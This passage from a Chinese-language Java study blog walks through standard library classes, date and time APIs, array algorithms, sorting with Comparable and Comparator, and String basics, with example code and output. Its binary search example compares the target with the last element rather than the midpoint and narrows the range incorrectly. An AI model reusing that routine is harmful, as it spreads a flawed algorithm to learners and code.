alt="image-20220915152440508"></p><h3 id="BigInteger类"><a href="#BigInteger类" class="headerlink" title="BigInteger类"></a>BigInteger类</h3><p>存储大的整数</p><p>示例代码:</p><pre><code class="java">package com.sakura.api;import java.math.BigInteger;public class Test1 &#123;    public static void main(String[] args) &#123;        BigInteger bigInteger = new BigInteger(&quot;999999999998484844554544545&quot;);        System.out.println(bigInteger);        BigInteger b1 = new BigInteger(&quot;300&quot;);        BigInteger b2 = new BigInteger(&quot;200&quot;);        System.out.println(&quot;加法\tb1.add(b2) = &quot; + b1.add(b2));        System.out.println(&quot;减法\tb1.subtract(b2) = &quot; + b1.subtract(b2));        System.out.println(&quot;乘法\tb1.multiply(b2) = &quot; + b1.multiply(b2));        System.out.println(&quot;除法\tb1.divide(b2) = &quot; + b1.divide(b2));        System.out.println(&quot;余数\tb1.remainder(b2) = &quot; + b1.remainder(b2));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915161917396.png" alt="image-20220915161917396"></p><h3 id="BigDecimal类"><a href="#BigDecimal类" class="headerlink" title="BigDecimal类"></a>BigDecimal类</h3><p>存储确切的小数</p><pre><code class="java">package com.sakura.api;import java.math.BigDecimal;import java.math.BigInteger;public class Test1 &#123;    public static void main(String[] args) &#123;        BigDecimal bigDecimal = new BigDecimal(&quot;3.1415926&quot;);        System.out.println(bigDecimal);        BigDecimal b1 = new BigDecimal(&quot;10.00&quot;);        BigDecimal b2 = new BigDecimal(&quot;3.00&quot;);        System.out.println(&quot;加法\tb1.add(b2) = &quot; + b1.add(b2));        System.out.println(&quot;减法\tb1.subtract(b2) = &quot; + b1.subtract(b2));        System.out.println(&quot;乘法\tb1.multiply(b2) = &quot; + b1.multiply(b2));        System.out.println(&quot;除法\tb1.divide(b2) = &quot; + b1.divide(b2,20,BigDecimal.ROUND_FLOOR));        System.out.println(&quot;余数\tb1.remainder(b2) = &quot; + b1.remainder(b2));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915162943916.png" alt="image-20220915162943916"></p><h3 id="Random类"><a href="#Random类" class="headerlink" title="Random类"></a>Random类</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915212254933.png" alt="image-20220915212254933"></p><pre><code class="java">import java.util.Random;public class Test1 &#123;    public static void main(String[] args) &#123;        Random random = new Random();        for (int i =0; i&lt;5;i++)&#123;            System.out.print(random.nextInt(50)+&quot;\t&quot;);            System.out.print(random.nextBoolean()+&quot;\t&quot;);            System.out.print(random.nextDouble()+&quot;\t&quot;);            System.out.println();        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915212834940.png" alt="image-20220915212834940"></p><p>还可以设置种子:</p><pre><code class="java">import java.util.Random;public class Test1 &#123;    public static void main(String[] args) &#123;        Random random = new Random(1);  //此处设置种子为1        for (int i =0; i&lt;10;i++)&#123;            System.out.println(random.nextInt(50)+&quot;\t&quot;);        &#125;    &#125;&#125;</code></pre><p>输出:</p><pre><code class="java">35    38    47    13    4    4    34    6    28    48    </code></pre><p>每次运行程序，输出的结果都一致</p><h3 id="日期时间Api"><a href="#日期时间Api" class="headerlink" title="日期时间Api"></a>日期时间Api</h3><p>已经过时的方法:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915221033738.png" alt="image-20220915221033738"></p><h3 id="Calendar类"><a href="#Calendar类" class="headerlink" title="Calendar类"></a>Calendar类</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915222848061.png" alt="image-20220915222848061"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915223307597.png" alt="image-20220915223307597"></p><p>示例代码:</p><pre><code class="java">package com.sakura.api;import java.util.Calendar;public class Test1 &#123;    public static void main(String[] args) &#123;        Calendar calendar = Calendar.getInstance();        //System.out.println(calendar);        System.out.println(&quot;calendar.get(Calendar.YEAR) = &quot; + calendar.get(Calendar.YEAR));        System.out.println(&quot;(calendar.get(Calendar.MONTH)+1) = &quot; + (calendar.get(Calendar.MONTH) + 1));        System.out.println(&quot;calendar.get(Calendar.DATE) = &quot; + calendar.get(Calendar.DATE));        System.out.println(&quot;calendar.get((Calendar.HOUR)) = &quot; + calendar.get((Calendar.HOUR)));        /*修改日期        *属性: year,month,data...        * 值:正数 向后 负数 向前        * calender(属性,值);        * */        calendar.add(Calendar.YEAR,28);        System.out.println(&quot;calendar.get(Calendar.YEAR) = &quot; + calendar.get(Calendar.YEAR));        calendar.add(Calendar.YEAR,20);        System.out.println(&quot;calendar.get(Calendar.YEAR) = &quot; + calendar.get(Calendar.YEAR));        /*        设置时间        calender.set(year,month,data)         */        calendar.set(2050,1,1,5,20);        System.out.println(&quot;calendar.get(Calendar.YEAR) = &quot; + calendar.get(Calendar.YEAR));        System.out.println(&quot;calendar.get(Calendar.MONTH) = &quot; + calendar.get(Calendar.MONTH));    &#125;&#125;</code></pre><p>输出:</p><pre><code class="java">calendar.get(Calendar.YEAR) = 2022(calendar.get(Calendar.MONTH)+1) = 9calendar.get(Calendar.DATE) = 15calendar.get((Calendar.HOUR)) = 11calendar.get(Calendar.YEAR) = 2050calendar.get(Calendar.YEAR) = 2070calendar.get(Calendar.YEAR) = 2050calendar.get(Calendar.MONTH) = 1</code></pre><h3 id="获取时区"><a href="#获取时区" class="headerlink" title="获取时区"></a>获取时区</h3><pre><code class="java">import java.util.TimeZone;public class Test1 &#123;    public static void main(String[] args) &#123;        String[] availableIDs = TimeZone.getAvailableIDs();        for(String availableID : availableIDs)&#123;            System.out.println(availableID);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915232253904.png" alt="image-20220915232253904"></p><h3 id="日期格式化"><a href="#日期格式化" class="headerlink" title="日期格式化"></a>日期格式化</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916000801519.png" alt="image-20220916000801519"></p><p>示例代码:</p><pre><code class="java">import java.text.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;public class DataTest &#123;    public static void main(String[] args) throws ParseException &#123;            /*    日期转换：     */        //    日期--&gt;字符串        DateFormat df1 = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);        Date date1 = new Date();        System.out.println(date1);        String res1 = df1.format(date1);        System.out.println(res1);        //    字符串--&gt;日期        DateFormat df2 = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);        String datastr = &quot;2022-09-16 00:15:41&quot;; //要解析的字符串内容必须与格式完全匹配，否则报错        Date date2 = df2.parse(datastr);        System.out.println(date2);    &#125;&#125;</code></pre><h3 id="新增的三个日期对象"><a href="#新增的三个日期对象" class="headerlink" title="新增的三个日期对象"></a>新增的三个日期对象</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916002810246.png" alt="image-20220916002810246"></p><p>示例代码:</p><pre><code class="java">import java.time.LocalDate;import java.time.LocalDateTime;import java.time.LocalTime;import java.time.Month;public class TestDate &#123;    public static void main(String[] args) &#123;        /*        LocalDate 年 月 日        不可变日期，一旦对日期做出修改会生成一个新的LocalDate记录改变后的日期        minusDays():日期减少         */        //对 年 月 日 进行操作        LocalDate now = LocalDate.now();        System.out.println(now);        int year = now.getYear();        int month = now.getMonthValue();        int day = now .getDayOfMonth();        System.out.println(&quot;year = &quot; + year);        System.out.println(&quot;month = &quot; + month);        System.out.println(&quot;day = &quot; + day);        System.out.println(&quot;-----------&quot;);        Month month1 = now.getMonth();        System.out.println(&quot;month1 = &quot; + month1);        System.out.println(month1.getValue());        System.out.println(&quot;-----------&quot;);                LocalDate localDate = now.minusDays(15);        System.out.println(&quot;now = &quot; + now);        System.out.println(&quot;localDate = &quot; + localDate);        System.out.println(&quot;-----------&quot;);        LocalDate of = LocalDate.of(2050,12,31); //对年月日进行操作        System.out.println(of);        LocalDate localDate1 = of.plusDays(1);        System.out.println(localDate1);        System.out.println(&quot;-----------&quot;);        //对 时 分 秒 进行操作        LocalTime localTime = LocalTime.now();        System.out.println(&quot;localTime = &quot; + localTime);//尾数是纳秒        System.out.println(&quot;-----------&quot;);        //同时对 年 月 日 时 分 秒 进行操作        LocalDateTime  localDateTime = LocalDateTime.now();        System.out.println(&quot;localDateTime = &quot; + localDateTime);        LocalDateTime of1 = LocalDateTime.of(2050,12,31,15,22);        System.out.println(&quot;of1 = &quot; + of1);    &#125;&#125;</code></pre><p>输出:</p><pre><code>2022-09-16year = 2022month = 9day = 16-----------month1 = SEPTEMBER9-----------now = 2022-09-16localDate = 2022-09-01-----------2050-12-312051-01-01-----------localTime = 01:13:08.425-----------localDateTime = 2022-09-16T01:13:08.425of1 = 2050-12-31T15:22</code></pre><h3 id="获取与指定时区时间和两个日期间隔"><a href="#获取与指定时区时间和两个日期间隔" class="headerlink" title="获取与指定时区时间和两个日期间隔"></a>获取与指定时区时间和两个日期间隔</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916140917835.png" alt="image-20220916140917835"></p><p><strong>使用period计算时间间隔</strong></p><p>示例代码:</p><pre><code class="java">import java.time.LocalDate;import java.time.Period;public class Test2 &#123;    public static void main(String[] args) &#123;        LocalDate l1 = LocalDate.now();        LocalDate l2 = LocalDate.of(2050,2,18);        System.out.println(&quot;l1 = &quot; + l1);        System.out.println(&quot;l2 = &quot; + l2);        Period period = Period.between(l1,l2);        System.out.println(&quot;period = &quot; + period);        System.out.println(&quot;period.getYears() = &quot; + period.getYears());        System.out.println(&quot;period.getMonths() = &quot; + period.getMonths());    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916142343404.png" alt="image-20220916142343404"></p><p><strong>使用Duration计算两个时间间隔</strong></p><p>示例代码:</p><pre><code class="java">import java.time.Duration;import java.time.LocalDateTime;public class Test2 &#123;    public static void main(String[] args) &#123;        LocalDateTime l1 = LocalDateTime.now();        LocalDateTime l2 = LocalDateTime.of(2050,12,31,15,21);        Duration duration = Duration.between(l1,l2); //计算两个时间的时间间隔        System.out.println(&quot;duration = &quot; + duration);        System.out.println(&quot;duration.toDays() = &quot; + duration.toDays());        System.out.println(&quot;duration.toHours() = &quot; + duration.toHours());    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916142900289.png" alt="image-20220916142900289"></p><h3 id="DateTimeFormatter类-日期格式化类"><a href="#DateTimeFormatter类-日期格式化类" class="headerlink" title="DateTimeFormatter类:日期格式化类"></a>DateTimeFormatter类:日期格式化类</h3><p>示例代码:</p><pre><code class="java">import java.time.LocalDateTime;import java.time.format.DateTimeFormatter;public class Test2 &#123;    public static void main(String[] args) &#123;        LocalDateTime l1 = LocalDateTime.now();        System.out.println(&quot;l1 = &quot; + l1);        /*        将日期转为字符串         */        DateTimeFormatter formatter = DateTimeFormatter.ISO_DATE; // DateTimeFormatter 有提供好的模板，可以直接使用        String format = formatter.format(l1);        System.out.println(&quot;format = &quot; + format);        //自定义格式        DateTimeFormatter formatter1 = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss E&quot;);        String result = formatter1.format(l1);        System.out.println(&quot;result = &quot; + result);        /*        将字符串转化为日期         */        DateTimeFormatter formatter2 = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss E&quot;);        String str = &quot;2022-09-16 14:51:26 星期五&quot;;        LocalDateTime parse= LocalDateTime.parse(str,formatter2);        System.out.println(&quot;parse = &quot; + parse);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916150014010.png" alt="image-20220916150014010"></p><h3 id="系统相关类"><a href="#系统相关类" class="headerlink" title="系统相关类"></a>系统相关类</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916151720605.png" alt="image-20220916151720605"></p><pre><code class="java">import java.util.Properties;public class SystemTest &#123;    public static void main(String[] args) &#123;        long l = System.currentTimeMillis(); //        System.out.println(&quot;l = &quot; + l);        System.gc(); //运行垃圾回收器        int [] arr = &#123;10,20,30&#125;;        int [] newArr = new int[arr.length];        System.arraycopy(arr,0,newArr,0,arr.length);        for (int i :newArr)&#123;            System.out.println(i);        &#125;        System.out.println(&quot;-----------------&quot;);        Properties properties = System.getProperties();//        properties.list(System.out);        String property = System.getProperty(&quot;java.version&quot;);        System.out.println(&quot;property = &quot; + property);        // Runtime        Runtime r1 = Runtime.getRuntime();        Runtime r2 = Runtime.getRuntime();        System.out.println(r1==r2); //说明了Runtime创建的对象都是同一个        System.out.println(&quot;r1.totalMemory() = &quot; + r1.totalMemory()); //总内存        System.out.println(&quot;r1.freeMemory() = &quot; + r1.freeMemory()); //剩余内存    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916170328632.png" alt="image-20220916170328632"></p><h2 id="数组的算法升华"><a href="#数组的算法升华" class="headerlink" title="数组的算法升华"></a>数组的算法升华</h2><h3 id="数组的反转"><a href="#数组的反转" class="headerlink" title="数组的反转"></a>数组的反转</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220918230400278.png" alt="image-20220918230400278"></p><p><strong>方法一 创建一个新数组</strong></p><pre><code class="java">public class ArrayTest &#123;    public static void main(String[] args) &#123;        int [] arr = &#123;10,20,30,40,50,60,70&#125;;        //交换方法一 创建一个新数组        int [] newarr = new int[arr.length];        int index = 0;        for (int i =arr.length-1;i&gt;=0;i--)&#123;            newarr[index++] = arr[i];        &#125;        for (int i : newarr) &#123;            System.out.println(i);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220918233551604.png" alt="image-20220918233551604"></p><p><strong>方法二数组内交换</strong></p><pre><code class="java">public class ArrayTest &#123;    public static void main(String[] args) &#123;        int [] arr = &#123;10,20,30,40,50,60,70&#125;;        //交换方法二 数组内交换        for (int i =0;i&lt;arr.length/2;i++)&#123;            int temp;            temp = arr[i];            arr[i] = arr[arr.length-1-i];            arr[arr.length-1-i] = temp;        &#125;        for (int i : arr) &#123;            System.out.println(i);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220918234451781.png" alt="image-20220918234451781"></p><h3 id="数组的二分查找"><a href="#数组的二分查找" class="headerlink" title="数组的二分查找"></a>数组的二分查找</h3><pre><code class="java">public class ArrayTest &#123;    public static void main(String[] args) &#123;        int[] arr = &#123;10, 20, 30, 40, 50, 60, 70,82,92,103&#125;;        //二分查找。二分查找排序必须是有序的        int res = binarySearch(arr,103);        System.out.println(&quot;您要查找的数字下标为&quot;+res);    &#125;    private static int binarySearch(int[] arr, int ele) &#123;        int ArrIndex = 0;        int ArrEnd = arr.length - 1;        while (ArrIndex &lt;= ArrEnd) &#123;            int ArrMid = (ArrIndex + ArrEnd) / 2;            if (ele &gt; arr[ArrMid]) &#123;                ArrIndex = ArrMid + 1;            &#125; else if (ele &lt; arr[ArrEnd])&#123;                ArrEnd = ArrMid;            &#125; else &#123;                return ArrMid;            &#125;        &#125;        return -1;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220919002943734.png" alt="image-20220919002943734"></p><h1 id="day17"><a href="#day17" class="headerlink" title="day17"></a>day17</h1><h2 id="数组的扩容"><a href="#数组的扩容" class="headerlink" title="数组的扩容"></a>数组的扩容</h2><p>示例代码:</p><pre><code class="java">public class ArrTest &#123;    @Test    public void test01()&#123;        //旧数组不够要扩容        String [] strarr = &#123;&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;&#125;;        //现在有需求，需要将数组扩容至原来的两倍、        String [] newarr = new String[strarr.length*2];        //先将旧数组复制到新数组        System.arraycopy(strarr,0,newarr,0,3);        //添加需要的值        newarr[strarr.length] = &quot;李白&quot;;        newarr[strarr.length+1] = &quot;杜甫&quot;;        newarr[strarr.length+2] = &quot;白居易&quot;;        //将新数组的地址赋值给旧数组        strarr = newarr;        //输出旧数组        for (String s : strarr) &#123;            System.out.println(s);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921144123079.png" alt="image-20220921144123079"></p><h2 id="数组的插入"><a href="#数组的插入" class="headerlink" title="数组的插入"></a>数组的插入</h2><p><strong>数组未满</strong></p><p>示例代码:</p><pre><code class="java">     @Test    public void test02()&#123;        //数组的插入，分两种情况，数组未满和数组已满        //1.数组未满        String [] arr = new String[5];        arr[0] = &quot;蔡徐坤&quot;;        arr[1] = &quot;肖战&quot;;        arr[2] = &quot;王一博&quot;;        System.arraycopy(arr,1,arr,2,2); //从第二个元素开始，整体后移一个位置        arr[1] = &quot;赵四&quot;; //在第二个位置插入赵四        for (String s : arr) &#123;            System.out.println(s);        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921150522702.png" alt="image-20220921150522702"></p><p><strong>数组已满</strong></p><p>示例代码:</p><pre><code class="java">    @Test    public void test03()&#123;        //数组已满的时候插入元素        String [] arr = &#123;&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;&#125;;        //需求：在张三和李四中间插入一个蔡徐坤        //由于数组已满，所以我们需要进行扩容，并将改变之前的赋值给新数组        String [] newarr = new String[arr.length+1]; //扩容操作        int index = 1;        for (int i =0;i&lt;index;i++)&#123;            newarr[i] = arr[i];        &#125;        System.arraycopy(arr,1,newarr,2,2);        newarr[1] = &quot;蔡徐坤&quot;;        arr = newarr;        for (String s : arr) &#123;            System.out.println(s);        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921151843085.png" alt="image-20220921151843085"></p><h2 id="数组的删除"><a href="#数组的删除" class="headerlink" title="数组的删除"></a>数组的删除</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921160641109.png" alt="image-20220921160641109"></p><p>思路一:</p><p>新建一个数组</p><pre><code class="java">    @Test    public void test04()&#123;        String [] arr = &#123;&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;&#125;;        //新建一个数组        String [] newarr = new String[arr.length-1];        newarr[0] = arr[0];        newarr[1] = arr[2];        arr = newarr;        for (String s : arr) &#123;            System.out.println(s);        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921161127117.png" alt="image-20220921161127117"></p><p>思路二:</p><p>在数组内进行操作</p><pre><code class="java">    @Test    public void test05()&#123;        String [] arr = &#123;&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;&#125;;        //数组内进行操作        System.arraycopy(arr,2,arr,1,1);        arr[2] = null;        for (String s : arr) &#123;            System.out.println(s);        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921161356596.png" alt="image-20220921161356596"></p><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921165230529.png" alt="image-20220921165230529"></p><p>示例代码:</p><pre><code class="java">    @Test    public void test06()&#123;        int [] arr = &#123;100,50,90,45,56,73,20&#125;;        for (int i =0;i&lt;arr.length-1;i++)&#123;            int minindex = i;            for (int j=i+1;j&lt;=arr.length-1;j++)&#123;                if (arr[minindex] &lt;= arr[j])&#123;                    continue;                &#125;else &#123;                    minindex = j;                &#125;            &#125;            int temp = arr[i];            arr[i] = arr[minindex];            arr[minindex] = temp;        &#125;        for (int i : arr) &#123;            System.out.println(i);        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921172432856.png" alt="image-20220921172432856"></p><h2 id="数组的工具类"><a href="#数组的工具类" class="headerlink" title="数组的工具类"></a>数组的工具类</h2><p><strong>Arrays.toString函数</strong></p><pre><code class="java">    @Test    public void test11()&#123;        int [] arr = &#123;10,20,50,32,12&#125;;        System.out.println(arr);        System.out.println(Arrays.toString(arr));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922140706344.png" alt="image-20220922140706344"></p><p>输出数组的值</p><p><strong>Arrays.deepToString函数</strong></p><p>Array.toString函数只能显示一维数组</p><pre><code class="java">    @Test    public void test11()&#123;        int [] [] arrs = &#123;&#123;1,2&#125;,&#123;22,43&#125;,&#123;97,67&#125;&#125;;        System.out.println(Arrays.toString(arrs));        System.out.println(Arrays.deepToString(arrs));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922141005991.png" alt="image-20220922141005991"></p><p><strong>Arrays.sort方法</strong></p><pre><code class="java">    @Test    public void test07()&#123;        //Array.sort可以对数组进行排序        int [] arr = &#123;50,56,12,80,5&#125;;        System.out.println(Arrays.toString(arr));        Arrays.sort(arr);        System.out.println(Arrays.toString(arr));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922133838302.png" alt="image-20220922133838302"></p><p>问题：如何对对象数组进行比较?</p><p>如果我们直接进行排序就会报错，因为程序不知道根据什么进行比较</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922134730091-16638256523091.png" alt="image-20220922134730091"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922134744471.png" alt="image-20220922134744471"></p><p>解决方法:重写Comparable</p><p>方法一:继承的方式</p><p>示例代码:</p><pre><code class="java">    public void test08()&#123;        Person p1 = new Person(&quot;David&quot;,17);        Person p2 = new Person(&quot;瑞贝卡&quot;,15);        Person p3 = new Person(&quot;Lucy&quot;,19);        Person [] arr = &#123;p1,p2,p3&#125;;        System.out.println(Arrays.toString(arr));        Arrays.sort(arr);        System.out.println(Arrays.toString(arr));    &#125;    class Person implements Comparable&#123;        @Override        public int compareTo(Object o) &#123;            Person p = (Person)o;            return this.age-p.age;        &#125;        String name;        int age;        public Person(String name, int age) &#123;            this.name = name;            this.age = age;        &#125;        public Person() &#123;        &#125;        public String getName() &#123;            return name;        &#125;        public void setName(String name) &#123;            this.name = name;        &#125;        public int getAge() &#123;            return age;        &#125;        public void setAge(int age) &#123;            this.age = age;        &#125;        @Override        public String toString() &#123;            return &quot;Person&#123;&quot; +                    &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +                    &quot;, age=&quot; + age +                    &#39;&#125;&#39;;        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922135320269.png" alt="image-20220922135320269"></p><p>方法二:采用匿名内部类</p><pre><code class="java">    @Test    public void test09()&#123;        Person p1 = new Person(&quot;David&quot;,17);        Person p2 = new Person(&quot;瑞贝卡&quot;,15);        Person p3 = new Person(&quot;Lucy&quot;,19);        Person [] arr = &#123;p1,p2,p3&#125;;        System.out.println(Arrays.toString(arr));        Arrays.sort(arr, new Comparator&lt;Person&gt;() &#123;            @Override            public int compare(Person o1, Person o2) &#123;                Person p1 = (Person) o1;                Person p2 = (Person) o2;                return p1.getAge()-p2.getAge();            &#125;        &#125;);        System.out.println(Arrays.toString(arr));    &#125;    class Person&#123;        String name;        int age;        public Person(String name, int age) &#123;            this.name = name;            this.age = age;        &#125;        public Person() &#123;        &#125;        public String getName() &#123;            return name;        &#125;        public void setName(String name) &#123;            this.name = name;        &#125;        public int getAge() &#123;            return age;        &#125;        public void setAge(int age) &#123;            this.age = age;        &#125;        @Override        public String toString() &#123;            return &quot;Person&#123;&quot; +                    &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +                    &quot;, age=&quot; + age +                    &#39;&#125;&#39;;        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922135738345.png" alt="image-20220922135738345"></p><p><strong>Arrays.fill函数</strong></p><p>注意：此函数范围为左闭右开</p><p>[n,m)</p><pre><code class="java">    @Test    public void test10()&#123;        int [] arr = &#123;10,20,50,32,12&#125;;        System.out.println(Arrays.toString(arr));        Arrays.fill(arr,0,2,666); //注意:此函数范围是左闭右开        System.out.println(Arrays.toString(arr));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922140159868.png" alt="image-20220922140159868"></p><p><strong>Arrays.equals函数</strong></p><p>比较的是内容及其下标是否完全一致</p><pre><code class="java">    @Test    public void test12()&#123;        int [] arr1 = &#123;10,20,50,32,12&#125;;        int [] arr2 = &#123;10,20,50,32,12&#125;;        System.out.println(arr1==arr2);        boolean flag = Arrays.equals(arr1,arr2);        System.out.println(&quot;flag = &quot; + flag);    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922141245975.png" alt="image-20220922141245975"></p><p><strong>Arrays.copyOf函数</strong></p><p>复制旧数组，创建一个新数组</p><pre><code class="java">    @Test    public void test13()&#123;        int [] arr1 = &#123;10,20,50,32,12&#125;;        int [] arr2 = Arrays.copyOf(arr1,2);        System.out.println(Arrays.toString(arr2));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922141529755.png" alt="image-20220922141529755"></p><p><strong>Arrays.copyOfRange函数</strong></p><p>复制旧数组的一段，创建一个新数组</p><p>范围也是左闭右开</p><p>[n,m)</p><pre><code class="java">    @Test    public void test13()&#123;        int [] arr1 = &#123;10,20,50,32,12&#125;;        int [] arr2 = Arrays.copyOfRange(arr1,2,4);        System.out.println(Arrays.toString(arr2));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922141939165.png" alt="image-20220922141939165"></p><h2 id="字符串的简介介绍"><a href="#字符串的简介介绍" class="headerlink" title="字符串的简介介绍"></a>字符串的简介介绍</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922143602790-16638285641583.png" alt="image-20220922143602790"></p><h2 id="创建字符串的方式"><a href="#创建字符串的方式" class="headerlink" title="创建字符串的方式"></a>创建字符串的方式</h2><pre><code class="java">public class TestSrting &#123;    public static void main(String[] args) &#123;        //方式一        String s1 = &quot;你好&quot;;        //方式二        char [] a = &#123;&#39;a&#39;,&#39;b&#39;&#125;;        String s2 = new String(a);        System.out.println(s2);        //方式三        String s3 = new String(&quot;世界&quot;);        //方式四        byte [] bytes = &#123;65,66,67,97&#125;;        String s4 = new String(bytes); //会将byte类型中的数字解析为对应字符        System.out.println(s4);        String s5 = new String(bytes,1,2); //从1开始，取两个        System.out.println(s5);        //方式五 通过方法创建        char [] c = &#123;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;&#125;;        int b = 5;        String s6 = &quot;&quot;+b; //字符串与整数相连接成为字符串        String s7 = String.valueOf(b); //方法返回值为字符串        String s8 = String.copyValueOf(c,0,3);        //方法有很多，多翻阅文档    &#125;&#125;</code></pre><h2 id="对象的个数问题"><a href="#对象的个数问题" class="headerlink" title="对象的个数问题"></a>对象的个数问题</h2><pre><code class="java">public class TestSrting &#123;    public static void main(String[] args) &#123;        String s1 = &quot;hello&quot;;        String s2 = &quot;hello&quot;;        System.out.println(s1==s2);        System.out.println(s1.equals(s2));            &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922150958579.png" alt="image-20220922150958579"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922151425322.png" alt="image-20220922151425322"></p><pre><code class="java">public class TestSrting &#123;    public static void main(String[] args) &#123;        String s1 = &quot;hello&quot;;        String s2 = new String(&quot;hello&quot;);        System.out.println(s1==s2);        System.out.println(s1.equals(s2));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922151244855.png" alt="image-20220922151244855"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922151514096.png" alt="image-20220922151514096"></p><h2 id="String内存分析"><a href="#String内存分析" class="headerlink" title="String内存分析"></a>String内存分析</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922153204909.png" alt="image-20220922153204909"></p><p><img 